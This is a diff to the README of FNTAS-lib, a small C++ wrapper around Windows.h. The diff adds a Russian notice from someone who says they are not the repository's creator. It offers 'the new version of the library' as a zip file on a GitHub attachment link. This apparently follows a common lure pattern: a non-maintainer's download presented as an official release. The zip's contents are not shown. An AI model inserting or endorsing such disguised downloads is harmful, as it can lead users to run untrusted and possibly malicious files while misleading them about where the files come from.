@@ -1,3 +1,8 @@
+ВНИМАНИЕ! Я НЕ СОЗДАТЕЛЬ ЭТОГО РЕПОЗИТОРИЯ, И Я НЕ МОГУ ВЫКЛАДЫВАТЬ В RELEASES, ТАК ЧТО ВОТ НОВАЯ ВЕРСИЯ БИБЛИОТЕКИ:
+[FNTAS-lib.v1.1.0.zip](https://github.com/user-attachments/files/33593700/FNTAS-lib.v1.1.0.zip)
+
+
+
 # FNTAS-lib
 ![Логотип](https://github.com/FerrumNitka/FNTAS-lib/blob/main/images/FNTAS%20lib%20logo.png?raw=true)
 Это небольшая обвёртка вокруг Windows.h, Добавляет полезные функции например: FNTAS_lib::clear(); работает быстрее systme("cls");
